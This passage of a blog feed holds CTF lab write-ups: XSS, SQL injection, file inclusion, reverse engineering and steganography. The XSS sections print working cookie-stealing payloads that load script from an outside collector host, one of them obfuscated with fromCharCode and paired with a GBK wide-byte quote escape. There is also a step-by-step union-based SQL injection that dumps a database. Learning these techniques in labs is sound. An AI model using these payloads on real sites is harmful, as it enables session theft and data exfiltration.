    <content type="html"><![CDATA[<p>XSS2 writeup.</p><a id="more"></a><p>本题目与<a href="https://whitywhite.club/2020-03-09/Stage1Day2-Web/#XSS1" xss1"" target="_blank" rel="noopener">XSS1</a>的不同之处在于并没有告知过滤了哪些字符，我们将XSS1的payload输入后直接查看被过滤后的结果：</p><table><tr><td bgcolor="#87CEFA">hello&quot;;document.write(&quot;&lt;img&#32;src=x&#32;onerror=s=createElement('script');body.appendChild(s);s.src='http://xss.fbisb.com/NXEO';&gt;&quot;);//</td></tr></table><center><img src="https://s1.ax1x.com/2020/03/12/8mr6fI.jpg" alt="8mr6fI.jpg" border="0"></center>可以看到后台将<>替换为空，将单引号和双引号用反斜杠转义了。结合给出的提示，看到html使用GBK编码，联想到使用宽字节注入：<h1 id="如何使用-amp-防御"><a href="#如何使用-amp-防御" class="headerlink" title="如何使用&amp;防御"></a>如何使用&amp;防御</h1><ul><li><p>“宽字节”：GB2312、GBK、GB18030、BIG5、Shift_JIS等，占两字节；ASCII占一字节。</p></li><li><p>触发条件：PHP6以下+magic_quote_gpc=on+使用 addslashes()函数对输入的单引号、双引号 、 反斜杠和 NULL 进行转义处理</p></li><li><p>利用方法: 输入%df%22时首先经过上面 addslashes 函数转义变成了%df%5c%22（%5c是反斜杠\），之后后台将被转义后的输入数据返送回前端，前端对其进行 GBK 编码，那么%df%5c 转换成了一个汉字，而双引号就逃逸了出来：</p><center><img src="https://s1.ax1x.com/2020/03/12/8mgIWd.jpg" alt="8mgIWd.jpg" border="0"></center></li><li><p>防御手段：由于 php6 以上的版本 get_magic_quotes_gpc 选项被删除，故不可以再使用addslashes()函数进行转义。对于宽字节SQLi，可以用 mysqli_real_escape_string函数代替以前的addslashes 函数， 他们之间的区别就是 mysql_real_escape_string 会根据mysql 对象中的 mysql-&gt;charset 属性来对待传入的字符串，因此可以根据当前字符集来进行过滤，从而防止了宽字节注入。</p></li></ul><h1 id="后续处理"><a href="#后续处理" class="headerlink" title="后续处理"></a>后续处理</h1><p>虽然实现了双引号逃逸，但可以看到payload里还是有双引号和单引号，这时若被转义则不会生效。此时可以使用<code>fromCharCode()</code>函数进行绕过，这样可以将payload部分转为他们的ascii值，然后作为参数传入这个函数，从而达到防止被转义和过滤的目的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:name=%d5%22;document.write(String.fromCharCode(102,34,60,105,109,103,32,115,114,99,61,120,32,111,110,101,114,114,111,114,61,115,61,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,115,41,59,115,46,115,114,99,61,39,104,116,116,112,58,47,47,120,115,115,46,102,98,105,115,98,46,99,111,109,47,78,88,69,79,39,59,62,34));//</span><br></pre></td></tr></table></figure><hr><blockquote><p>由于对pwn的了解不足，先对相关知识进行储备：</p><ul><li><a href="https://bbs.pediy.com/thread-247217.htm" title="pwntools" target="_blank" rel="noopener">pwntools</a></li><li><a href="https://luomuxiaoxiao.com/?p=578" title="PLT&amp;GOT" target="_blank" rel="noopener">PLT&amp;GOT</a></li></ul></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;XSS2 writeup.&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="blue-whale" scheme="https://purewhitywhite.github.io/tags/blue-whale/"/>
    
      <category term="Web" scheme="https://purewhitywhite.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>Stage1Day4 Reverse&amp;Misc</title>
    <link href="https://purewhitywhite.github.io/2020-03-11/Stage1Day4-Reverse-Misc/"/>
    <id>https://purewhitywhite.github.io/2020-03-11/Stage1Day4-Reverse-Misc/</id>
    <published>2020-03-11T10:46:44.000Z</published>
    <updated>2020-03-11T13:23:13.332Z</updated>
    
    <content type="html"><![CDATA[<p>Blue-whale OJ<br>Reverse sign in、junior math、LSB&amp;LSB2 writeup.</p><a id="more"></a><p>首先搞清楚一个一直都没弄清楚的问题，什么是逆向，什么是pwn（好像都是对着一堆汇编调来调去啊）？</p><blockquote><p>逆向工程（Reverse engineering），又称反向工程，是一种技术过程，即对一项目标产品进行逆向分析及研究，从而演绎并得出该产品的处理流程、组织结构、功能性能规格等设计要素，以制作出功能相近，但又不完全一样的产品。逆向工程源于商业及军事领域中的硬件分析。其主要目的是，在无法轻易获得必要的生产信息下，直接从成品的分析，推导产品的设计原理。-<a href="https://ctf-wiki.github.io/ctf-wiki/reverse/introduction-zh/" target="_blank" rel="noopener">逆向工程-ctf-wiki</a></p></blockquote><blockquote><p>根据我做过的一点逆向题目，感觉就是<del>把文件拖到IDA或者ollydbg里</del>先静态分析一些文件，包括它的一些代码混淆加壳等的，再动态调试之类的吧</p></blockquote><blockquote><p>”Pwn”是一个黑客语法的俚语词 ，是指攻破设备或者系统 。发音类似“砰”，对黑客而言，这就是成功实施黑客攻击的声音——砰的一声，被“黑”的电脑或手机就被你操纵。</p></blockquote><blockquote><p>我的理解就是利用程序存在的一些问题诸如堆、栈溢出，rop，uaf之类的，来执行shellcode，最后获得目标机器的root权限。</p></blockquote><p><a href="https://error4hack.com/x64dbg-vs-ollydbg-vs-ida-pro/" target="_blank" rel="noopener">x64dbg vs Ollydbg vs IDA Pro</a></p><h1 id="Reverse-sign-in"><a href="#Reverse-sign-in" class="headerlink" title="Reverse sign in"></a>Reverse sign in</h1><p>用IDA打开之后直接按F5，main函数已经出来了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+0h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Please input your flag:"</span>, a2, a3);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%32s"</span>, &amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(&amp;s) == <span class="number">32</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_400686((__int64)&amp;s) )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Right!"</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Wrong!"</span>);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Wrong!"</span>);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到程序是一个flag检验器，输入flag后先判断有没有32个字符，进而再判断将输入的值带入一个<code>sub_400686</code>函数后的返回值，若是1就说明是flag。<br>进入<code>sub_400686</code>看看：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">sub_400686</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">char</span>)(*(_BYTE *)(i + a1) ^ byte_400818[i]) != i )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>意思是将a1（输入的值）逐位与<code>byte_400818</code>这个数组逐位进行<code>^（异或）</code>操作，如果他们的结果==循环变量i，那么就返回1（输入的flag对了）。<br>看看<code>byte_400818</code>：<center><img src="https://s2.ax1x.com/2020/03/11/8Er0lF.jpg" alt="8Er0lF.jpg" border="0"></center></p><blockquote><p>x dup(y)，x是重复的次数，（）里的y是要重复的数<br>刚好32个字符，那么可以编写脚本来找flag，思路是这样的，flag[i]^byte_400818[i] == i，那么flag[i] == byte_400818[i]^i</p></blockquote><p>代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先转十进制</span></span><br><span class="line">d = [<span class="number">102</span>, <span class="number">109</span>, <span class="number">99</span>, <span class="number">100</span>, <span class="number">127</span>, <span class="number">60</span>, <span class="number">54</span>, <span class="number">114</span>, <span class="number">87</span>, <span class="number">66</span>, <span class="number">100</span>, <span class="number">59</span>, <span class="number">123</span>, <span class="number">82</span>, <span class="number">124</span>, <span class="number">60</span>, <span class="number">102</span>, <span class="number">84</span>, <span class="number">96</span>, <span class="number">96</span>, <span class="number">39</span>, <span class="number">74</span>, <span class="number">73</span>, <span class="number">127</span>, <span class="number">113</span>, <span class="number">88</span>, <span class="number">82</span>, <span class="number">114</span>, <span class="number">125</span>, <span class="number">117</span>, <span class="number">42</span>, <span class="number">98</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">    print(chr(d[i] ^ i), end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure><h1 id="junior-math"><a href="#junior-math" class="headerlink" title="junior math"></a>junior math</h1><p>按F5查看伪代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Please input your flag:"</span>, a2, a3);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%32s"</span>, &amp;byte_602080);</span><br><span class="line">  sub_4005D6();</span><br><span class="line">  sub_40063F();</span><br><span class="line">  sub_4006A8();</span><br><span class="line">  sub_400711();</span><br><span class="line">  sub_40077A();</span><br><span class="line">  sub_4007E3();</span><br><span class="line">  sub_40084C();</span><br><span class="line">  sub_4008B5();</span><br><span class="line">  sub_400918();</span><br><span class="line">  sub_400981();</span><br><span class="line">  sub_4009EA();</span><br><span class="line">  sub_400A53();</span><br><span class="line">  sub_400ABC();</span><br><span class="line">  sub_400B25();</span><br><span class="line">  <span class="keyword">if</span> ( dword_602064 )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Wrong!"</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Right!"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>问题：print为何还输入了a2 a3两个参数？</p></blockquote><p>看到输入flag后进行了一堆函数运算，最后判断<code>dword_602064</code>这个东西是0的话输入值即为flag。<br>进入一个函数看看：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">sub_4005D6</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BOOL4 v0; <span class="comment">// edx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v0 = (byte_602080 - <span class="number">147</span>) * byte_602080 != <span class="number">-4590</span> || (byte_602082 - <span class="number">147</span>) * byte_602082 != <span class="number">-4850</span>;</span><br><span class="line">  result = v0 | (<span class="keyword">unsigned</span> <span class="keyword">int</span>)dword_602064;</span><br><span class="line">  dword_602064 |= v0;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到这个函数计算了输入字符串的第1位（byte_602080）进行运算后与-4590进行判断，如果这个将第一位带入左边的式子计算结果不等于-4590，那么||（或）的左侧就是一个1，如果等于的话就是0。返回值result貌似没有起到作用不分析，然后将<code>dword_602064</code>与v0进行逐位或，结果存入v0。<br>看了其他的函数结构都一样，变化的就是测试的是输入字符串的第几位。可以看出我们每一次都要满足v0是0，这样才能保证v0与<code>dword_602064</code>逐位或之后才不会出现1（出现1就错了），那么就要式输入字符串的每一位都满足每个函数里的一元二次运算。<br>试着挑一个算了算，<code>(byte_602080 - 147) * byte_602080 = -4590</code>的一个解为102，查ascii表为f，就很显然了。把每一位结果都算出来查ascii即可得到flag。</p><h1 id="LSB-amp-LSB2"><a href="#LSB-amp-LSB2" class="headerlink" title="LSB&amp;LSB2"></a>LSB&amp;LSB2</h1><h2 id="最低有效位（LSB）的原理："><a href="#最低有效位（LSB）的原理：" class="headerlink" title="最低有效位（LSB）的原理："></a>最低有效位（LSB）的原理：</h2><p>因为每个图片的颜色都是由“红”、“绿”、“蓝”三种颜色组成，图片中的其他颜色均可以由这三种颜色混合而成。然而PNG的每种颜色的大小在储存位中占8bit，而LSB隐写原理就是把每种颜色的最后一位进行改写，但是改写后的图片和原图相比，在人的眼中是没有区别的。</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>stegsolve打开图片后调整到Red plane0页面就可以看到这个二维码，扫码即得到flag。<br><center><img src="https://s1.ax1x.com/2020/03/11/8Eo4e0.jpg" alt="8Eo4e0.jpg" border="0"></center><br>LSB2的话用lint里提示的<code>zsteg -a secret.png</code>即可看到flag。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Blue-whale OJ&lt;br&gt;Reverse sign in、junior math、LSB&amp;amp;LSB2 writeup.&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Reverse" scheme="https://purewhitywhite.github.io/tags/Reverse/"/>
    
      <category term="blue-whale" scheme="https://purewhitywhite.github.io/tags/blue-whale/"/>
    
      <category term="Misc" scheme="https://purewhitywhite.github.io/tags/Misc/"/>
    
  </entry>
  
  <entry>
    <title>Stage1Day3 Web&amp;Misc</title>
    <link href="https://purewhitywhite.github.io/2020-03-10/Stage1Day3-Web-Misc/"/>
    <id>https://purewhitywhite.github.io/2020-03-10/Stage1Day3-Web-Misc/</id>
    <published>2020-03-10T11:07:53.000Z</published>
    <updated>2020-03-11T13:08:47.943Z</updated>
    
    <content type="html"><![CDATA[<p>Blue-whale OJ<br>Basic SQL、Invisible flag、docx writeup.</p><a id="more"></a><h1 id="Basic-SQL"><a href="#Basic-SQL" class="headerlink" title="Basic SQL"></a>Basic SQL</h1><p>上来先确定是什么类型的注入，当输入<code>&#39;</code>时候出错，说明这是一个字符型的注入点。<br><br>首先看当前数据表有几列，试到4时出错，说明有三列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; order by 4#</span><br></pre></td></tr></table></figure><p>接下来看前三列中回显在哪几列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; union select 1,2,3#</span><br></pre></td></tr></table></figure><p>可以看到最下面显示了2、3俩数字，表示可以利用这两个位置回显我们想要的结果，比如当前数据库数据库名、版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos; union select 1,database(),version()#</span><br><span class="line">//回显为news，5.5.62</span><br></pre></td></tr></table></figure><p>再看看所有的库名：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos; union select 1,group_concat(schema_name),3 from information_schema.schemata#</span><br><span class="line">回显为information_schema,news，information_schema库是MySQL自带的，它提供了访问数据库元数据（数据库名或表名、列的数据类型、访问权限等）的方式，优先看news库</span><br></pre></td></tr></table></figure><p>接下来就是爆表、列、数据了：<br>爆表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&apos;news&apos;#</span><br><span class="line">//回显为f1agfl4gher3,news，进f1agfl4gher3看看</span><br></pre></td></tr></table></figure><p>爆列：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;f1agfl4gher3&apos;#</span><br><span class="line">//回显为id,h3r31sfl4g，flag快来了</span><br></pre></td></tr></table></figure><p>爆数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos; union select 1,group_concat(id),group_concat(h3r31sfl4g) from f1agfl4gher3#</span><br><span class="line">//回显就有flag</span><br></pre></td></tr></table></figure><blockquote><p>这比较基础，就是sqli-labs第二关吧，不过sql注入各种操作很多，还有sqlmap的使用，这都是以后要学习的东西</p></blockquote><h1 id="Invisible-flag"><a href="#Invisible-flag" class="headerlink" title="Invisible flag"></a>Invisible flag</h1><p>看到图片只有一半的BLUE-WHALE，再结合提示里的图片长度，就知道了应该使用010editor来修改图片的长度了：<br><center><img src="https://s2.ax1x.com/2020/03/10/8FNRqU.jpg" alt="8FNRqU.jpg" border="0"></center><br>将修改后的结果导出为一个新的图片，即可在下方看到flag。</p><h1 id="docx"><a href="#docx" class="headerlink" title="docx"></a>docx</h1><p>结合提示知道docx格式的文件本质上是一个zip文件，修改后缀名后就可以解压。<br>一个docx文件可能会包含这些目录和组件：</p><ul><li>[Content_Types].xml<br>这个文件描述的是整个文档内容的类型，把各个xml文件组合成一个整体。</li><li>docProps文件夹<br>这个文件夹中的xml记录了docx文档的主要属性信息<br>Core.xml：描述文件的创建时间，标题，主题和作者等给予open xml约定文档格式的通用文件属性<br>App.xml：描述文档的其他属性，文档类型，版本，只读信息，共享，安全属性等特定的文件属性</li><li>rels 文件夹<br>这个文件夹存放了所有指定的rels文件<br>.res文件描述了文档结构中的起始关系，也可以叫做关系部件</li><li>item1.xml<br>包含了一些文档中出现的数据。例如自定义XML数据部件。</li></ul><p>打开修改后缀名后的文件，即可看到flag.xml，打开即可看到flag。</p><h1 id="体会"><a href="#体会" class="headerlink" title="体会"></a>体会</h1><blockquote><p>比较熟悉的Web部分做完了，接下来就是Misc、逆向和pwn了，都没咋做过，希望一切顺利</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Blue-whale OJ&lt;br&gt;Basic SQL、Invisible flag、docx writeup.&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="blue-whale" scheme="https://purewhitywhite.github.io/tags/blue-whale/"/>
    
      <category term="Misc" scheme="https://purewhitywhite.github.io/tags/Misc/"/>
    
      <category term="Web" scheme="https://purewhitywhite.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>Stage1Day2 Web</title>
    <link href="https://purewhitywhite.github.io/2020-03-09/Stage1Day2-Web/"/>
    <id>https://purewhitywhite.github.io/2020-03-09/Stage1Day2-Web/</id>
    <published>2020-03-09T14:12:50.000Z</published>
    <updated>2020-03-12T14:52:00.650Z</updated>
    
    <content type="html"><![CDATA[<p>Blue-whale OJ<br>BabyXSS、XSS1、BasicFileInclude writeup.</p><a id="more"></a><h1 id="BabyXSS"><a href="#BabyXSS" class="headerlink" title="BabyXSS"></a>BabyXSS</h1><center><img src="https://s2.ax1x.com/2020/03/09/89vTG4.jpg" alt="89vTG4.jpg" border="0"></center>可以看到这个输入框应该就是注入点了。下面这个地方要求输入一个md5后前六位恰好为等号右边的字符串，一开始以为是找碰撞之类的吧，不过结合hint里推荐的<kbd>proofofwork</kbd>来看应该是要慢慢试出来。不过在安装<kbd>cmake</kbd>、<kbd>MinGW</kbd>，多次google设置cmakefile均无果后选择使用<kbd>hashlib</kbd>包。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9999999999</span>):</span><br><span class="line">    s = hashlib.md5(str(i).encode(encoding=<span class="string">'utf8'</span>)).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> s.startswith(<span class="string">"xxxxx"</span>):</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>之后就很轻松了，得到对应的字符串后，在上方的留言框里放入获取cookie的脚本，即可将其提交到管理员的后台，（管理员在看到这条信息时）XSS平台便收到了管理员的token：<br><center><img src="https://s2.ax1x.com/2020/03/09/89zbHx.jpg" alt="89zbHx.jpg" border="0"></center><br>使用Burp抓包，将自己的cookie替换为这个token再发包即可得到flag。<br><center><img src="https://s2.ax1x.com/2020/03/09/8CS5If.jpg" alt="8CS5If.jpg" border="0"></center></p><h1 id="XSS1"><a href="#XSS1" class="headerlink" title="XSS1"></a>XSS1</h1><center><img src="https://s2.ax1x.com/2020/03/09/8C9KA0.jpg" alt="8C9KA0.jpg" border="0"></center><p>这题与<a href="https://whitywhite.club/2020-03-09/Stage1Day2-Web/#BabyXS" babyxss"" target="_blank" rel="noopener">BabyXSS</a>比较相似，也是获取管理员的cookie，不过这一次我们可以看到被注入xss的页面以及它过滤一些敏感符号的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"GET"</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">"text"</span> name=<span class="string">"name"</span> autofocus=<span class="string">"autofocus"</span> /&gt;</span><br><span class="line">        &lt;input type=<span class="string">"submit"</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>]))&#123;</span><br><span class="line">        $text = $_GET[<span class="string">'name'</span>];</span><br><span class="line">        $text = str_replace(<span class="string">'"'</span>,<span class="string">''</span>,$text);</span><br><span class="line">        $text = str_replace(<span class="string">'&gt;'</span>,<span class="string">''</span>,$text);</span><br><span class="line">        $text = str_replace(<span class="string">'&lt;'</span>,<span class="string">''</span>,$text);</span><br><span class="line">        $text = str_replace(<span class="string">"\n"</span>,<span class="string">''</span>,$text);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;svg&gt;&lt;script&gt;var a=\""</span>. $text . <span class="string">"\"&lt;/script&gt;&lt;/svg&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;hr /&gt;'</span>;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>可以看到本题对” &lt; &gt; 以及回车进行了过滤，便考虑使用html编码来绕过。</p><table><tr><td bgcolor="#87CEFA">hello&quot;;document.write(&quot;&lt;img&#32;src=x&#32;onerror=s=createElement('script');body.appendChild(s);s.src='http://xss.fbisb.com/NXEO';&gt;&quot;);//</td></tr></table>先将双引号闭合，再在html中写进去一个src属性为x（会出错）的img标签，然后onerror会在html中写进去一个src属性为cookie偷取链接的script，最后将后面的一个双引号注释掉。此处之注意将空格也进行编码处理（在提交的页面会进行检测）。输入文本框提交看看效果：<center><img src="https://s2.ax1x.com/2020/03/09/8CCqQe.jpg" alt="8CCqQe.jpg" border="0"></center><p>可以看到成功地写入了上面提到的img标签，并触发了chrome XSS Auditor的预警。</p><blockquote><p>PS:不知道出了什么问题XSS平台一直收不到cookie，有待进一步观察</p></blockquote><blockquote><p>注意到hint里提示，发现输入框有autofocus属性，想到可以结合onfocus来触发XSS，但是这个输入框已经闭合了，注入点并不在其中，又想到自己搞一个文本框，设置一个autofocus，这样管理员进入评论管理版后不用任何操作就会发送flag，但实测这样貌似还是不行</p></blockquote><h1 id="BasicFileInclude"><a href="#BasicFileInclude" class="headerlink" title="BasicFileInclude"></a>BasicFileInclude</h1><center><img src="https://s2.ax1x.com/2020/03/09/8Ci6u4.jpg" alt="8Ci6u4.jpg" border="0"></center><p>题目提示”flag就在这里，但是你看不到“。暗示要读取flag，鉴于不知道当前路径（无法使用file协议）,即考虑使用php伪协议php://filter</p><blockquote><p><strong>php://filter</strong> 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。</p></blockquote><p>这是其参数：</p><blockquote><p>resource=&lt;要过滤的数据流&gt;     这个参数是必须的。它指定了你要筛选过滤的数据流。<br><br>read=&lt;读链的筛选列表&gt;         该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。<br><br>write=&lt;写链的筛选列表&gt;    该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=upload.php</span><br><span class="line">这里读的过滤器为convert.base64-encode，即把输入流base64-encode。</span><br><span class="line">resource=upload.php，代表读取upload.php的内容</span><br></pre></td></tr></table></figure><blockquote><p>问题：一定要使用base64吗？还是说这是一种固定形式（网上几乎都是这种解答）</p></blockquote><p>照葫芦画瓢地构造payload:</p><table><tr><td bgcolor="#87CEFA">http://vps1.blue-whale.me:23338/?page=php://filter/read=convert.base64-encode/resource=flag</td></tr></table>网页上返回了一串base64编码，解码后发现这就是flag的代码。]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Blue-whale OJ&lt;br&gt;BabyXSS、XSS1、BasicFileInclude writeup.&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="blue-whale" scheme="https://purewhitywhite.github.io/tags/blue-whale/"/>
    
      <category term="Web" scheme="https://purewhitywhite.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>Stage1Day1 Web</title>
    <link href="https://purewhitywhite.github.io/2020-03-08/Stage1Day1-Web/"/>
    <id>https://purewhitywhite.github.io/2020-03-08/Stage1Day1-Web/</id>
    <published>2020-03-08T11:46:09.000Z</published>
    <updated>2020-03-11T13:09:38.545Z</updated>
    
